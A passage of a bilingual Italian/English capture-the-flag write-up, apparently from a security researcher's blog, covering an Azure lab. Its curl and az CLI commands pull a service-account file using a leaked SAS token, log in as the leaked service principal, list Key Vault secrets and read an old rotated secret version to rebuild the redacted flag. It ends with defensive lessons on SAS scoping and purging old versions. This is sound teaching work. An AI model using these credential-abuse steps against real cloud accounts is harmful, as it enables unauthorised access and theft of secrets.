+<span class="neutral">curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&amp;comp=list&amp;&lt;SAS&gt;'</span>
+<span class="neutral">curl -s 'https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?&lt;SAS&gt;'</span></pre>
+</div></div>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="neutral">{</span>
+<span class="neutral">  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",</span>
+  "client_secret": "<span class="danger">████████████████████████</span>",
+<span class="neutral">  "key_vault_name": "ccabana-kv-f5scjagc",</span>
+<span class="neutral">  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",</span>
+<span class="neutral">  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"</span>
+<span class="neutral">}</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="neutral">{</span>
+<span class="neutral">  "client_id": "dbcf2923-e4eb-4b72-a0a4-688aa1185cf5",</span>
+  "client_secret": "<span class="danger">████████████████████████</span>",
+<span class="neutral">  "key_vault_name": "ccabana-kv-f5scjagc",</span>
+<span class="neutral">  "key_vault_uri": "https://ccabana-kv-f5scjagc.vault.azure.net/",</span>
+<span class="neutral">  "tenant_id": "8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c"</span>
+<span class="neutral">}</span></pre>
+</div></div>
+    <p data-it="Un &lt;em&gt;service principal&lt;/em&gt; Azure AD completo: &lt;code&gt;client_id&lt;/code&gt;, &lt;code&gt;client_secret&lt;/code&gt;, &lt;code&gt;tenant_id&lt;/code&gt; e il nome del Key Vault. La fiducia che il chiosco riponeva nello storage si estende dritta dentro il vault. È il classico &lt;strong&gt;trust chain che compone&lt;/strong&gt;: ogni salto allarga il raggio d'azione del leak iniziale." data-en="A full Azure AD &lt;em&gt;service principal&lt;/em&gt;: &lt;code&gt;client_id&lt;/code&gt;, &lt;code&gt;client_secret&lt;/code&gt;, &lt;code&gt;tenant_id&lt;/code&gt;, and the Key Vault name. The trust the kiosk placed in storage extends straight into the vault. Classic &lt;strong&gt;compounding trust chain&lt;/strong&gt;: each hop widens the blast radius of the original leak.">Un <em>service principal</em> Azure AD completo: <code>client_id</code>, <code>client_secret</code>, <code>tenant_id</code> e il nome del Key Vault. La fiducia che il chiosco riponeva nello storage si estende dritta dentro il vault. È il classico <strong>trust chain che compone</strong>: ogni salto allarga il raggio d'azione del leak iniziale.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># mi autentico come il service principal trapelato</span>
+<span class="neutral">az login --service-principal \</span>
+<span class="neutral">  -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \</span>
+  -p '<span class="danger">████████████████████████</span>' \
+<span class="neutral">  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># authenticate as the leaked service principal</span>
+<span class="neutral">az login --service-principal \</span>
+<span class="neutral">  -u dbcf2923-e4eb-4b72-a0a4-688aa1185cf5 \</span>
+  -p '<span class="danger">████████████████████████</span>' \
+<span class="neutral">  --tenant 8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c</span></pre>
+</div></div>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># quali secret vivono nel vault?</span>
+<span class="neutral">az keyvault secret list --vault-name ccabana-kv-f5scjagc -o table</span>
+# key-shard-1  key-shard-2  key-shard-3  master-key (<span class="warn">scaduto 2020</span>)</pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># which secrets live in the vault?</span>
+<span class="neutral">az keyvault secret list --vault-name ccabana-kv-f5scjagc -o table</span>
+# key-shard-1  key-shard-2  key-shard-3  master-key (<span class="warn">expired 2020</span>)</pre>
+</div></div>
+    <div class="callout">
+  <div class="callout-label" data-it="// nota" data-en="// note">// nota</div>
+  <p data-it="&lt;code&gt;master-key&lt;/code&gt; sembra il jackpot, ma è &lt;strong&gt;scaduta nel 2020&lt;/strong&gt;: vicolo cieco. I tre &lt;code&gt;key-shard&lt;/code&gt; sono la strada giusta." data-en="&lt;code&gt;master-key&lt;/code&gt; looks like the jackpot, but it &lt;strong&gt;expired in 2020&lt;/strong&gt;: dead end. The three &lt;code&gt;key-shard&lt;/code&gt; secrets are the way."><code>master-key</code> sembra il jackpot, ma è <strong>scaduta nel 2020</strong>: vicolo cieco. I tre <code>key-shard</code> sono la strada giusta.</p>
+</div>
+
+    <h2 data-it="[04] La versione ruotata e la ricostruzione della flag" data-en="[04] The rotated version and rebuilding the flag" id='flag'>[04] La versione ruotata e la ricostruzione della flag</h2>
+    <p data-it="L'hint della room è esplicito: «se un valore sembra appena ruotato, chiediti com'era cinque minuti prima». Traduzione operativa: controllo lo &lt;em&gt;storico versioni&lt;/em&gt; di ogni shard." data-en="The room's hint is explicit: &quot;if a value looks freshly rotated, ask yourself what it looked like five minutes before that.&quot; Operationally: I check the &lt;em&gt;version history&lt;/em&gt; of every shard.">L'hint della room è esplicito: «se un valore sembra appena ruotato, chiediti com'era cinque minuti prima». Traduzione operativa: controllo lo <em>storico versioni</em> di ogni shard.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># controllo lo storico versioni di ogni shard</span>
+<span class="neutral">for s in key-shard-1 key-shard-2 key-shard-3; do</span>
+<span class="neutral">  az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name $s -o json</span>
+<span class="neutral">done</span>
+# shard-1: 1 versione   shard-3: 1 versione   <span class="warn">shard-2: 2 versioni, a 2s di distanza</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># check each shard's version history</span>
+<span class="neutral">for s in key-shard-1 key-shard-2 key-shard-3; do</span>
+<span class="neutral">  az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name $s -o json</span>
+<span class="neutral">done</span>
+# shard-1: 1 version   shard-3: 1 version   <span class="warn">shard-2: 2 versions, 2s apart</span></pre>
+</div></div>
+    <p data-it="&lt;code&gt;key-shard-1&lt;/code&gt; e &lt;code&gt;key-shard-3&lt;/code&gt; hanno una sola versione. &lt;code&gt;key-shard-2&lt;/code&gt; ne ha &lt;strong&gt;due&lt;/strong&gt;, create a due secondi di distanza: una rotazione lampo. Il valore corrente è l'esca; quello buono è nella versione &lt;strong&gt;precedente&lt;/strong&gt;, ancora abilitata." data-en="&lt;code&gt;key-shard-1&lt;/code&gt; and &lt;code&gt;key-shard-3&lt;/code&gt; have a single version. &lt;code&gt;key-shard-2&lt;/code&gt; has &lt;strong&gt;two&lt;/strong&gt;, created two seconds apart: a snap rotation. The current value is the bait; the good one is in the &lt;strong&gt;previous&lt;/strong&gt; version, still enabled."><code>key-shard-1</code> e <code>key-shard-3</code> hanno una sola versione. <code>key-shard-2</code> ne ha <strong>due</strong>, create a due secondi di distanza: una rotazione lampo. Il valore corrente è l'esca; quello buono è nella versione <strong>precedente</strong>, ancora abilitata.</p>
+    <div class="lang-it"><div class="code-block">
+<pre><span class="comment"># la versione CORRENTE è il depistaggio; leggo quella PRECEDENTE (ancora abilitata)</span>
+<span class="neutral">az keyvault secret show --vault-name ccabana-kv-f5scjagc \</span>
+  --name key-shard-2 --version <span class="ok">3d6492d2c6f74123bc754a9ded22b2a0</span> \
+<span class="neutral">  --query value -o tsv</span>
+# shard-1 + shard-2(old) + shard-3  =&gt;  <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
+<div class="lang-en"><div class="code-block">
+<pre><span class="comment"># the CURRENT version is the decoy; read the PREVIOUS one (still enabled)</span>
+<span class="neutral">az keyvault secret show --vault-name ccabana-kv-f5scjagc \</span>
+  --name key-shard-2 --version <span class="ok">3d6492d2c6f74123bc754a9ded22b2a0</span> \
+<span class="neutral">  --query value -o tsv</span>
+# shard-1 + shard-2(old) + shard-3  =&gt;  <span class="ok">THM{<span class="redaction">████████████████████</span>}</span></pre>
+</div></div>
+    <p data-it="Il punto sottile: in Key Vault una rotazione crea una &lt;em&gt;nuova versione&lt;/em&gt; ma &lt;strong&gt;non tocca&lt;/strong&gt; quelle vecchie. Restano &lt;em&gt;enabled&lt;/em&gt; e leggibili con lo stesso permesso &lt;em&gt;get&lt;/em&gt;. Chi ruota per rimediare a un leak spesso dimentica che il segreto trapelato è ancora lì, una &lt;code&gt;--version&lt;/code&gt; più indietro." data-en="The subtle point: in Key Vault a rotation creates a &lt;em&gt;new version&lt;/em&gt; but &lt;strong&gt;doesn't touch&lt;/strong&gt; the old ones. They stay &lt;em&gt;enabled&lt;/em&gt; and readable with the same &lt;em&gt;get&lt;/em&gt; permission. Whoever rotates to fix a leak often forgets the leaked secret is still there, one &lt;code&gt;--version&lt;/code&gt; back.">Il punto sottile: in Key Vault una rotazione crea una <em>nuova versione</em> ma <strong>non tocca</strong> quelle vecchie. Restano <em>enabled</em> e leggibili con lo stesso permesso <em>get</em>. Chi ruota per rimediare a un leak spesso dimentica che il segreto trapelato è ancora lì, una <code>--version</code> più indietro.</p>
+    <!-- policy: la flag è sempre oscurata, per scelta editoriale -->
+    <div class="callout">
+      <div class="callout-label" data-it="// flag — OSCURATA" data-en="// flag — REDACTED">// flag — OSCURATA</div>
+      <div class="code-block"><pre><span class="ok">THM{</span><span class="redaction" aria-label="flag oscurata">████████████████████</span><span class="ok">}</span></pre></div>
+      <p data-it="La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo &lt;code&gt;Enter&lt;/code&gt; lo batti tu." data-en="You won't find the flag here: the value itself teaches nothing, and half the fun is getting there. The methodology above is complete and reproducible — the last &lt;code&gt;Enter&lt;/code&gt; is yours to press.">La flag qui non la trovi: il valore in sé non insegna niente, e mezzo divertimento è arrivarci. La metodologia sopra è completa e riproducibile — l'ultimo <code>Enter</code> lo batti tu.</p>
+    </div>
+    <div class="callout-green">
+  <div class="callout-label" data-it="// lezione" data-en="// lesson">// lezione</div>
+  <p data-it="Ruotare un secret &lt;strong&gt;non cancella&lt;/strong&gt; le versioni precedenti: restano abilitate e leggibili finché non le disabiliti o le fai &lt;em&gt;purge&lt;/em&gt;. In Key Vault una rotazione è igiene solo se il vecchio materiale viene davvero invalidato. E a monte: mai un SAS token nel JS del client, scope minimo (Service SAS sul singolo blob, permessi giusti, scadenza breve), meglio ancora una &lt;em&gt;user delegation SAS&lt;/em&gt; legata ad Azure AD. Ogni token trapelato allarga il raggio dell'esplosione: storage → service principal → Key Vault." data-en="Rotating a secret &lt;strong&gt;does not delete&lt;/strong&gt; earlier versions: they stay enabled and readable until you disable or &lt;em&gt;purge&lt;/em&gt; them. In Key Vault a rotation is hygiene only if the old material is actually invalidated. Upstream: never ship a SAS token in client JS, keep scope minimal (a Service SAS on the single blob, least privilege, short expiry), and prefer an Azure AD-backed &lt;em&gt;user delegation SAS&lt;/em&gt;. Every leaked token widens the blast radius: storage → service principal → Key Vault.">Ruotare un secret <strong>non cancella</strong> le versioni precedenti: restano abilitate e leggibili finché non le disabiliti o le fai <em>purge</em>. In Key Vault una rotazione è igiene solo se il vecchio materiale viene davvero invalidato. E a monte: mai un SAS token nel JS del client, scope minimo (Service SAS sul singolo blob, permessi giusti, scadenza breve), meglio ancora una <em>user delegation SAS</em> legata ad Azure AD. Ogni token trapelato allarga il raggio dell'esplosione: storage → service principal → Key Vault.</p>
+</div>
+
+  </div><!-- /article-body -->
+  </article>
+  </main>
+
+  <div class="share-wrap">
+    <span class="share-lbl" data-it="// condividi" data-en="// share">// condividi</span>
+    <div class="share-btns">
+      <a class="share-btn" href="https://x.com/intent/tweet?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Fcryptocabana%2F&via=PaoloCostanzoit" target="_blank" rel="noopener">X / Twitter</a>
+      <a class="share-btn" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fpaolocostanzo.github.io%2Fctf%2Fhacker-holidays-2026%2Fcryptocabana%2F" target="_blank" rel="noopener">LinkedIn</a>
+      <button class="share-btn" onclick="copyLink(this)" data-it="copia link" data-en="copy link">copia link</button>
+    </div>
+  </div>
+
+  <aside class="author-box">
+    <span class="ab-label" data-it="// L'autore" data-en="// The author">// L'autore</span>
+    <div class="ab-name">Paolo Costanzo</div>
+    <div class="ab-role" data-it="Ricercatore indipendente di sicurezza · Co-Founder &amp;amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte" data-en="Independent Security Researcher · Co-Founder &amp;amp; CEO @ CoDe RTD · Professor of Cybersecurity &amp;amp; AWS @ ITS ICT Piemonte">Ricercatore indipendente di sicurezza · Co-Founder &amp; CEO @ CoDe RTD · Docente di Cybersecurity &amp; AWS @ ITS ICT Piemonte</div>
+    <p class="ab-bio" data-it="Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile." data-en="Independent research on cloud security, agentic AI systems, threat intelligence, networks and authorized offensive validation. Every report states its methodology, limitations and sources, and is reproducible where possible.">Ricerca indipendente su cloud security, sistemi agentici e AI, threat intelligence, reti e validazione offensiva autorizzata. Ogni report dichiara metodologia, limiti e fonti, e dove possibile è riproducibile.</p>
+    <div class="ab-links">
+      <a class="ab-cta" data-it="Scrivimi →" data-en="Get in touch →" href="mailto:me@paolocostanzo.com">Scrivimi →</a>
+      <a href="https://www.paolocostanzo.com" target="_blank" rel="noopener noreferrer">paolocostanzo.com</a>
+      <a href="https://www.linkedin.com/in/paolocostanzoit/" target="_blank" rel="noopener noreferrer">LinkedIn</a>
+      <a href="https://github.com/paolocostanzo" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </div>
+  </aside>
+  <div class="article-footer">
+    <a data-it="← tutti i writeup dell'evento" data-en="← all event writeups" href="/ctf/hacker-holidays-2026/">← tutti i writeup dell'evento</a>
+    <span class="footer-copy" data-it="© 2026 NonèCostanzo — lab autorizzato, per scopi educativi" data-en="© 2026 NonèCostanzo — authorised lab, for educational purposes">© 2026 NonèCostanzo — lab autorizzato, per scopi educativi</span>
+  </div>
+  <button id="back-top" onclick="window.scrollTo({top:0,behavior:'smooth'})" data-it="↑ top" data-en="↑ top">↑ top</button>
+  <script>
+    function setLang(lang){
+      document.querySelectorAll('[data-'+lang+']').forEach(el=>{const val=el.getAttribute('data-'+lang);
+        if(el.tagName==='META'){el.setAttribute('content',val);}else if(el.tagName==='TITLE'){document.title=val;}else{el.innerHTML=val;}});
+      document.documentElement.lang=lang;
+      document.querySelectorAll('.lang-btn').forEach(b=>{const on=b.textContent.toLowerCase()===lang;b.classList.toggle('active',on);b.setAttribute('aria-pressed',on);});
+      document.querySelectorAll('.lang-it').forEach(el=>el.style.display=lang==='en'?'none':'');
+      document.querySelectorAll('.lang-en').forEach(el=>el.style.display=lang==='en'?'block':'none');
+      localStorage.setItem('lang',lang);
+    }
+    function copyLink(btn){const en=document.documentElement.lang==='en';
+      navigator.clipboard.writeText(window.location.href).then(()=>{btn.textContent=en?'copied ✓':'copiato ✓';btn.classList.add('ok');
+      setTimeout(()=>{btn.textContent=en?'copy link':'copia link';btn.classList.remove('ok');},2000);});}
+    const s=localStorage.getItem('lang'); if(s&&s!=='it')setLang(s);
+    const bar=document.getElementById('read-bar'),bt=document.getElementById('back-top');
+    window.addEventListener('scroll',()=>{const h=document.documentElement;bar.style.width=(h.scrollTop/(h.scrollHeight-h.clientHeight))*100+'%';bt.classList.toggle('vis',h.scrollTop>400);},{passive:true});
+  </script>
+</body>
+</html>
